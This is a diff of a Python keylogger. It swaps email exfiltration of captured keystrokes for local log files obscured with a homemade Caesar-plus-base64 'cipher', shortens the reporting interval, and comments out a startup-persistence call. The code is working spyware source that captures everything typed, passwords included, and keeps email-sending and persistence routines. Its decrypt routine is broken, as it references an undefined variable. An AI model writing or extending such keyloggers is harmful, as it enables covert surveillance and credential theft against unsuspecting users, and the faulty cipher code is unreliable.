@@ -1,22 +1,58 @@
 import keyboard, os, subprocess, sys, shutil
-import smtplib
+import smtplib, base64
 from threading import Timer
 from datetime import datetime
 from getpass import getuser
 
-# from webbrowser import open as wbopen
-# from base64 import b64decode
-# from base64 import b64encode
+class Cipher:
+   def encrypt(plain_text, key=16):
+    encrypted = ""
+    for c in plain_text:
+        if c.isupper():
+            c_index = ord(c) - ord('A')
+            c_shifted = (c_index + key) % 26 + ord('A')
+            c_new = chr(c_shifted)
+            encrypted += c_new
+        elif c.islower():
+            c_index = ord(c) - ord('a') 
+            c_shifted = (c_index + key) % 26 + ord('a')
+            c_new = chr(c_shifted)
+            encrypted += c_new
+        elif c.isdigit():
+            c_new = (int(c) + key) % 10
+            encrypted += str(c_new)
+        else:
+            encrypted += c
+    encrypted = base64.b64encode(base64.b16encode(bytes(encrypted, encoding='utf-8')))
+    return encrypted
 
-SEND_REPORT_EVERY = 10
-EMAIL_ADDRESS = ""
-EMAIL_PASSWORD = r""
-SEND_EMAIL = r""
+   def decrypt(ciphertext, key=16):
+    decrypted = ""
+    for c in ciphertext:
+        if c.isupper(): 
+            c_index = ord(c) - ord('A')
+            c_og_pos = (c_index - key) % 26 + ord('A')
+            c_og = chr(c_og_pos)
+            decrypted += c_og
+        elif c.islower(): 
+            c_index = ord(c) - ord('a') 
+            c_og_pos = (c_index - key) % 26 + ord('a')
+            c_og = chr(c_og_pos)
+            decrypted += c_og
+        elif c.isdigit():
+            c_og = (int(c) - key) % 10
+            decrypted += str(c_og)
+        else:
+            decrypted += c
+    encrypted = base64.b16decode(base64.b64decode(bytes(encrypted, encoding='utf-8')))
+    return decrypted
+
+SEND_REPORT_EVERY = 3
+
 
 class Keylogger:
-    def __init__(self, interval, report_method="email"):
+    def __init__(self, interval):
         self.interval = interval
-        self.report_method = report_method
 
         # this is the string variable that contains the log of all 
         # the keystrokes within `self.interval`
@@ -47,7 +83,7 @@ class Keylogger:
     def report_to_file(self):
 
         with open(f"{self.filename}.txt", "w") as f:
-            print(self.log, file=f)
+            print(Cipher.encrypt(self.log, key=16), file=f)
         print(f"[+] Saved {self.filename}.txt")
 
     def sendmail(self, to_email, email, password, message):
@@ -61,12 +97,8 @@ class Keylogger:
         if self.log:
             self.end_dt = datetime.now()
             self.update_filename()
-            if self.report_method == "email":
-                self.log += str(getuser()) + "\n"
-                self.sendmail(SEND_EMAIL, EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            elif self.report_method == "file":
-                self.log += f"\n\n{getuser()}\n"
-                self.report_to_file()
+            self.log += f"\n\n{getuser()}\n"
+            self.report_to_file()
             self.start_dt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
@@ -87,11 +119,6 @@ def run_at_startup():
 
 
 if __name__ == "__main__":
-    run_at_startup()
-    # wbopen("https://www.youtube.com/watch?v=7YuAzR2XVAM")
-    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-    # print("started")
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    # run_at_startup()
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
-
-
